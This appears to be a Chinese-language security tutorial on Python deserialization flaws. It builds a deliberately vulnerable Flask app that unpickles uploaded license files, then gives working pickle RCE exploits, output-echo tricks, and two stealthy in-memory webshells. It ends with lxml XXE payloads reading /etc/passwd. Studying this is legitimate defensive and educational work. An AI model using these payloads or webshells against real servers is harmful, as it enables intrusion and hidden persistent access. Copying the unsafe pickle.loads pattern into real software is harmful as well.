#  反序列化漏洞之Python篇   
原创 说书人  台下言书   2023-12-26 19:11  
  
## 关于序列化与反序列化   
> 序列化（Serialization）：这是将对象的状态转换为可以保存或传输的形式（通常是字节序列）的过程。在这个过程中，对象的公共、私有字段和其他组成部分被转换为可以存储在文件中、数据库中或通过网络传输的格式。这使得对象的状态可以在不同的环境中重构或共享。  
  
> 反序列化（Deserialization）：这是序列化的逆过程，即将先前序列化的字节序列转换回原始对象的过程。在反序列化过程中，字节序列被解析，并根据序列化时保存的数据重新构造对象。这通常涉及重建对象的类结构和其内部状态。  
  
  
这些过程在不同的编程语言和框架中有所不同，但基本概念是相似的。序列化和反序列化广泛应用于数据持久化、深度复制对象、远程过程调用（RPC）和数据交换等领域。  
  
在像 Java、Python、PHP、C#、C++这样的面向对象编程语言中，序列化通常指的是对象的序列化，包括对象的属性和状态。在这些语言中，即使基本数据类型在某种意义上也被视为对象（例如，在 Java 中，基本类型有对应的包装类）  
## python篇   
### python涉及到的序列化与反序列化  
  
<table><thead><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);min-width: 85px;">类型</th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);min-width: 85px;">安全性</th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);min-width: 85px;">描述</th></tr></thead><tbody style="border-width: 0px;border-style: initial;border-color: initial;"><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">pickle</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">高风险</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">可以序列化几乎所有的Python对象，包括有能力执行代码的对象。</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">yaml</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">潜在风险</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">PyYAML在加载YAML文件时可能会执行YAML文件中的任意Python代码</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">xml</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">潜在风险</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">lxml在特定配置下可能导致xxe</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">json</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">通常安全</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">json反序列化过程本身不会执行任何代码。</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">msgpack</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">通常安全</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">与json类似，主要用于数据的序列化和反序列化，不涉及代码执行。</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">protobuf</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">通常安全</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">专注于结构化数据的高效序列化，不涉及代码执行</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">marshmallow</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">通常安全</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">主要用于对象的序列化和反序列化，并不执行代码</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);min-width: 85px;">avro</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">通常安全</td><td style="border-color: rgb(204, 204, 204);min-width: 85px;">主要用于数据的序列化和反序列化，不涉及代码执行。</td></tr></tbody></table>  
### pickle(python3)/cPickle(python2)  
> python中有很多魔术方法在被pickle反序列化的时候会自动调用，**当序列化/反序列化的内容是可控的且不考虑其他魔术方法下本身存在的危险方法时**，主要的风险来自于 **__reduce__** 和 **__reduce_ex__** 这两个特殊方法，用法差不多，但其中后者的优先级大于前者。  
> 下文暂且将这两者当作同一种东西，只以 **__reduce__** 展开描述  
> 另外pickle存在load和loads、dump和dumps，区别在于一个和文件交互，一个和内存交互。下文只以内存交互的方式来举例。  
  
  
**__reduce__** 要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle。要么返回一个元组，这个元组包含2到5个元素，其中包括：  
- 一个可调用的对象，用于重建对象时调用  
  
- 一个参数元素，供那个可调用对象使用  
  
- 被传递给 __setstate__ 的状态（可选）  
  
- 一个产生被pickle的列表元素的迭代器（可选）  
  
- 一个产生被pickle的字典元素的迭代器（可选）  
  
**__reduce__** 的作用是定义对象的序列化和反序列化方式，如果显式地定义了该方法，pickle 在序列化对象时会调用该方法，然后只序列化 **__reduce__** 方法所返回的可调用对象和参数元组，不再依赖于原始类的构造函数或默认的对象创建机制。  
  
如果没有显式定义**__reduce__**，则会默认地序列化对象的状态和属性，python需要在当前命名空间去找类的定义。  
  
我们通过几个例子去理解：  
  
创建一个a.py，代码如下：  
```
import pickle

class Payload:

    def __init__(self):
        self.wgp_sec = 'WgpSec'  # 实例变量

serialized = pickle.dumps(Payload())
print(serialized)
# 序列化后的数据：b'\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Payload\x94\x93\x94)\x81\x94}\x94\x8c\x07wgp_sec\x94\x8c\x06WgpSec\x94sb.'

deserialize = pickle.loads(serialized)
print(deserialize.wgp_sec)  # 可以正常访问类实例的wgp_sec变量，输出WgpSec


```  
  
这里没有显式地定义**__reduce__** ，则默认序列化对象的状态和属性，反序列化的时候在当前命名空间找到Payload类的定义并且反序列化为一个新的对象。  
  
如果我们把a.py中生成的序列化数据拿到b.py里面去尝试反序列化，会发生什么呢？  
  
创建一个b.py，代码如下：  
```
import pickle

try:
    deserialize_1 = pickle.loads(b'\x80\x04\x952\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Payload\x94\x93\x94)\x81\x94}\x94\x8c\x07wgp_sec\x94\x8c\x06WgpSec\x94sb.')
except Exception as e:
    print(e)
    # 抛出错误：Can't get attribute 'Payload' on <module '__main__' from 'b.py'>


```  
  
发现在当前模块'__main__' from 'b.py'中找不到Payload这个类。这是因为我们是在命令行中直接运行程序的，两个程序有着独立的命名空间，在b.py中无法访问到a.py中的Payload类的定义，所以会抛出错误。  
  
不过在一个典型的 Python web 应用中，不同的 Python 模块（.py 文件）通常共享相同的全局命名空间，所以不会出现找到不xxx的情况，但拥有各自独立的局部命名空间，以确保请求的隔离性和安全性。  
  
现在我们将 **__reduce__** 加入其中，创建新的a.py如下：  
```
import os
import pickle

class Payload:

    def __init__(self):
        self.wgp_sec = 'WgpSec'  # 实例变量

    def __reduce__(self):
        return (os.popen, ('echo 123',))

serialized = pickle.dumps(Payload())
print(serialized)
# 序列化后的数据：b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x05popen\x94\x93\x94\x8c\x08echo 123\x94\x85\x94R\x94.'

```  
  
其实看序列化后的数据能大概看出来类的实例变量没有被序列化进去。我们再将这个序列化后的数据放到b.py里面去反序列化试试，代码如下：  
```
import pickle

deserialize = pickle.loads(b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x05popen\x94\x93\x94\x8c\x08echo 123\x94\x85\x94R\x94.')
print(deserialize.read())  # 输出123
try:
    # 尝试访问原先类的变量
    print(deserialize.wgp_sec)
except Exception as e:
    print(e)
    # 抛出错误：'_io.TextIOWrapper' object has no attribute 'wgp_sec'

```  
  
由此可见，在b.py中被反序列化后的对象实际上是os.popen()，而不是原先的Payload类实例。python不需要去找Payload类定义，但是会去找os，不过python自带的模块以及pip安装的包都是全局命名空间的（不同的虚拟环境间，第三方包只作用于当前虚拟环境），自然也就不会报错。  
  
再做一个小小的拓展，代码如下：  
```
import os
import pickle

class Payload:

    def __init__(self):
        self.wgp_sec = 'WgpSec'  # 实例变量

    def __reduce__(self):
        return (os.popen, ('echo 123',))

serialized1 = pickle.dumps(Payload)
serialized2 = pickle.dumps(Payload())

print(serialized1)
# 序列化后的数据：b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Payload\x94\x93\x94.'

print(serialized2)
# 序列化后的数据：b'\x80\x04\x95\x1f\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x05popen\x94\x93\x94\x8c\x08echo 123\x94\x85\x94R\x94.'

```  
  
可以看到serialized1序列化的是类定义本身，而serialized2则是序列化类的实例，__reduce__所返回的方法和参数没有被序列化进去。  
  
因为__reduce__ 方法通常是为类的实例（对象）定义的，而不是为类本身定义的。当你序列化一个类的实例时，pickle会检查该类是否定义了 __reduce__ 方法，如果定义了，就会在序列化时调用该方法来自定义对象的序列化和反序列化过程。  
  
我们再放到一个web场景去展示，假设一个场景如下：  
  
生成license：供应商通过传入参数来定义授权的对象和时间，经过aes加密并序列化为二进制文件最终提供给浏览器下载。  
  
验证license：需求方拿到license后上传到系统，系统接收后先反序列化，然后aes解密对应的字段，然后验证是否到期，最后返回给浏览器验证结果。  
  
下面web.py为一个简单的flask应用，功能是生成license和验证license，代码如下：  
```
import datetime
import io
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import pickle
from flask import Flask, request, send_file


class Tool:
    def __init__(self):
        self._key = b'1234567812345678'

    def encrypt(self, plaintext):
        iv = get_random_bytes(16)
        cipher = AES.new(self._key, AES.MODE_CBC, iv)
        padded_plaintext = pad(plaintext.encode(), 16)
        ciphertext = cipher.encrypt(padded_plaintext)
        encrypted = base64.b64encode(iv + ciphertext).decode()
        return encrypted

    def decrypt(self, ciphertext):
        ciphertext = base64.b64decode(ciphertext)
        iv = ciphertext[:16]
        ciphertext = ciphertext[16:]
        cipher = AES.new(self._key, AES.MODE_CBC, iv)
        padded_plaintext = cipher.decrypt(ciphertext)
        plaintext = unpad(padded_plaintext, 16).decode()
        return plaintext


app = Flask(__name__)
tool = Tool()


@app.route('/', methods=['GET', 'POST'])
def index():
    return '这是首页'


# 生成license
@app.route('/genLic', methods=['GET', 'POST'])
def genLic():
    name = tool.encrypt(request.args.get('name'))
    expiry = tool.encrypt(request.args.get('expiry'))
    lic = {'name': name, 'expiry': expiry}
    # 序列化为二进制文件提供下载
    lic = io.BytesIO(pickle.dumps(lic))
    return send_file(lic, as_attachment=True, download_name='license.bin')


# 验证license
@app.route('/verifyLic', methods=['GET', 'POST'])
def verifyLic():
    if request.files:
        try:
            lic = request.files['lic'].read()
            # 反序列化并解析
            lic = pickle.loads(lic)
            name = tool.decrypt(lic['name'])
            expiry = tool.decrypt(lic['expiry'])
            if int(expiry) > int(datetime.datetime.now().strftime('%Y%m%d%H%M%S')):
                status = '正常'
            else:
                status = '已过期'
            result = f'授权对象: {name}</br>有效时间: {expiry}</br>授权状态: {status}'
        except:
            result = '验证失败'
    else:
        result = ''
    return result


if __name__ == '__main__':
    app.run(host="127.0.0.1", port=8888)


```  
  
通过观察代码可以发现在验证license的环节存在反序列化，并且反序列化的内容通过前端上传二进制获得，也就是内容可控，所以这里就形成了一个简单的反序列化漏洞。  
  
可以使用下面的exp进行命令执行：  
```
import pickle
import os
import requests

class Payload:
    def __reduce__(self):
        return (os.system, ('echo rce > rce.txt',))

serialized = pickle.dumps(Payload())
file = {'lic': ('lic.bin', serialized, 'application/binary')}
res = requests.post('http://127.0.0.1:8888/verifyLic', files=file,proxies={'http':'127.0.0.1:8080'})
print(res.text)


```  
  
执行完后到flask的工作目录查看发现生成了rce.txt  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKEWKquwtEn2xvOTmN20Gec2Df3nJEtLJHayTYpdckdibcxPPtU25rzmA/640?wx_fmt=jpeg&from=appmsg "")  
  
也可以根据当前场景来构造一个可回显的exp，代码如下：  
```
import pickle
import requests


class Payload:
    def __reduce__(self):
        return (eval, ("__import__('json').loads('{\"name\":\"'+tool.encrypt(__import__('os').popen('id').read().replace('\\n','\\\\n'))+'\",\"expiry\":\"omq3GOM1yE9OC3D394aeo3742LTnWwmxo2ewXdt7NXo=\"}')",))


serialized = pickle.dumps(Payload())
file = {'lic': ('lic.bin', serialized, 'application/binary')}
res = requests.post('http://127.0.0.1:8888/verifyLic', files=file,proxies={'http':'127.0.0.1:8080'})
print(res.text)

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKeyvTDbGxrvxf12o27GScAXanmlPrALRl4LUxRsH32RHKTdUkiaNTceg/640?wx_fmt=jpeg&from=appmsg "")  
  
这个回显利用场景比较有限，依赖flask中方法所自定义的返回，还需要根据正确的业务逻辑来编写payload才能实现回显，不推荐。  
  
推荐的做法是操作Response，不过这个场景中，首先就是当反序列化直接执行命令后会走到except捕获的地方，不会抛出错误，同时重写了响应的body。其次是这里没有显式地定义Response，即便操作响应头，到后面也会被flask重写。  
  
跟踪flask源码发现在构建Response的时候会检查session是否为空，如果不为空的话会将session放到Response的cookie中去![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKTUNVDSxCYrYy5vLU4rAtCCofFjleibBiaguULhm4VVcGjvjvKsqTaCAw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKia2PD1noEU1RfByNEnlAgfib8YHNeZ94llrIWXrvCIr6X4jl9qJLrsLQ/640?wx_fmt=jpeg&from=appmsg "")  
  
所以我们可以将回显放到session里面，然后从响应头里面的Cookie里面取得一个jwt，直接base64解码头部即可获得回显  
  
构造exp如下：  
```
import pickle
import requests

echo = '''from flask import current_app,sessioncurrent_app.secret_key = '1'session['vul'] = __import__('os').popen(request.headers.get('cmd')).read()'''

class Payload:
    def __reduce__(self):
        return (exec, (echo,))

serialized = pickle.dumps(Payload())
file = {'lic': ('lic.bin', serialized, 'application/binary')}
res = requests.post('http://127.0.0.1:8888/verifyLic', headers={'cmd': 'ls'}, files=file, proxies={'http': '127.0.0.1:8080'})


```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKkGeo6vjyyoibt9MmOIStyEQj9lBwL7CvDdl0D3OPCxJa29VvaI0Slicw/640?wx_fmt=jpeg&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwK45SfTGjicgbibaQd00RxxeH66eUYlGHgIYmjh5L4Ju2o5bICnSOoNvDQ/640?wx_fmt=jpeg&from=appmsg "")  
  
除此之外，还可以打内存马。打内存马的基本逻辑就是通过反序列化动态注册一条路由或者修改原有路由的视图函数。  
  
在flask中用@app.route装饰器注册路由，本质上用的是是add_url_rule方法。当然，也可以直接用add_url_rule方法去注册。该方法可接收rule、endpoint、view_func、**options等参数用于定义路由和绑定视图函数。  
  
在flask源码中跟踪该方法发现关键的步骤是下图的两个操作![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKcjFIxHAQibbfTlaNqhKkAUPcH5qXyYFZ6ELS7ske0P1LBjtPEpH9j1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
因此，我们可以直接获取app对象然后去操作这两个方法。可以直接新增一条路由并自定义一个视图函数来打内存马，也可以不新增路由，直接修改现有的视图函数，通过逻辑判断来决定是否进入内存马方法。  
  
两种方式，构造exp如下：  
```
import pickle
import requests

mem_shell_1 = '''from flask import current_app,requestdef a():    try:        if 'unix' in request.headers.get('User-Agent'):            cmd=request.form['data']            res=__import__('os').popen(cmd).read()        else:            res=verifyLic2()    except Exception as e:        res=index()    return rescurrent_app.view_functions.update({'index':a})'''

mem_shell_2 = '''from flask import current_app,requestfrom werkzeug.routing import Ruledef b():    def fake_page():        return '伪装成正常逻辑响应页面、waf拦截页面、404页面、重定向到首页等操作'    try:        if 'unix' in request.headers.get('User-Agent'):            cmd=request.form['data']            res=__import__('os').popen(cmd).read()        else:            res=fake_page()    except Exception as e:        res=fake_page()    return resrule = Rule('/favorite.ico', endpoint='b',methods=['GET','POST'])current_app.url_map.add(rule)current_app.view_functions.update({'b':b})'''


class Payload:
    def __reduce__(self):
        # 直接在原来的路由上打内存马
        return (exec, (mem_shell_1,))
        # # 新增一条路由打内存马
        # return (exec, (mem_shell_2,))


serialized = pickle.dumps(Payload())
file = {'lic': ('lic.bin', serialized, 'application/binary')}
res = requests.post('http://127.0.0.1:8888/verifyLic', files=file, proxies={'http': '127.0.0.1:8080'})
print(res.text)

```  
  
1、直接在原来的路由上打内存马，修改一个已有的函数  
  
正常访问首页![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKPZ76kbsU0eeKYEVib7Ac8pibic0d3Tennic5akragsFr8Qpzr7IxZZEokQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
访问内存马![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKFRWDobG5K1Jic05bQqBPqEugTDITtLDUKLPSycV7w2UbQbyIbib2LW7Q/640?wx_fmt=jpeg&from=appmsg "")  
  
  
2、新增一条路由和函数  
  
直接请求![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKsueTticZoTLokL2qpmOcCMONH1agwdr3hI2KXO2ziboswhpj0ZeIu1mQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
加上逻辑请求![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKJN5zoUKHicP67ZibxCVdRl0tjJAKd1E3yJXX5ATaibQNkK6e2nckclgPA/640?wx_fmt=jpeg&from=appmsg "")  
  
### PyYAML  
  
PyYAML目前github最新版本为6.0.1，推送于2023.7.18，而上一个版本6.0发布于2021.10.4，根据Changes可以发现在6.0版本强制要求用户自己定义Loader加载器，不存在默认加载器了。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKfQLziaY4D8XzlQ3LbEp5NaiawYaw62RdCzf7wUctJSBsf9fZ1LIWylqA/640?wx_fmt=jpeg&from=appmsg "")  
  
在2020.3.19发布的5.3.1版本中修复了在python/object/new构造函数期间执行任意代码的问题![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwKnd0MriaNpux2nWJkcaVK8LKzyHibIGdhm5FLvI9VdWXaBawJpaKfM79A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
所以PyYAML在实战中几乎不会遇到可利用的场景了，故本文不再拿出来分析。可能有些ctf会出历史漏洞相关的题目，关于历史漏洞，可以看这篇文章（https://forum.butian.net/share/2288），写的已经是非常详细了。  
### xml  
  
解析xml转化为python中的对象，也是一种反序列化行为，这里主要就是xxe漏洞。在python中比较主流的用来解析xml的库有lxml、xml.etree.ElementTree、defusedxml、defusedxml、minidom、xml.sax。  
  
其中，lxml在默认情况下不支持加载外部实体，但是可以通过参数配置来允许。其他的这些直接就是不支持加载外部实体。  
  
例子一：  
```
from lxml import etree

xml_data = f"""<!DOCTYPE root [<!ENTITY test SYSTEM "http://dnslog">]><root>&test;</root>"""

# 默认情况下load_dtd=False, no_network=True
# 表示不允许加载外部实体，不允许网络请求
# 这里通过手动指定的方式开起来
parser = etree.XMLParser(load_dtd=True, no_network=False)
tree = etree.fromstring(xml_data, parser)

```  
  
xxe打ssrf需要手动开启load_dtd、no_network两个参数的支持，如果ssrf响应的是xml格式则可以取得回显，否则无回显。  
  
例子二：  
```
from lxml import etree

xml_data = """<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>"""
parser = etree.XMLParser(load_dtd=True)
tree = etree.fromstring(xml_data, parser)
# 获取并打印回显
print(tree.xpath('/root/text()')[0])

```  
  
读取本地文件只需要手动开启load_dtd即可，可以直接取得回显。![](https://mmbiz.qpic.cn/mmbiz_jpg/TegOSv0yja6mZV7YM6KjLZK6orbXlWwK6vgE5uLf8OJ7abZ1hWdiadQKk30cjxjJSKMeEkaB9cFDdwpDVBFSiaHQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
